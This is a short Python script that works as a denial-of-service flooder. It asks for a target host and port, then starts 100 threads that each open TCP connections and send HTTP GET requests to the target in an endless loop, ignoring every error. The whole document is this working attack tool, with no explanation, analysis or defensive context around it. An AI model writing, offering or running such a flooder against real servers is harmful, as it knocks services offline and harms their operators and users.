#!/usr/bin/python3

import socket
import threading

target = input()
port = int(input())

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: "+target.encode()+b"\r\n\r\n")
            s.close()
        except:
            pass

for _ in range(100):
    t = threading.Thread(target=attack)
    t.start()

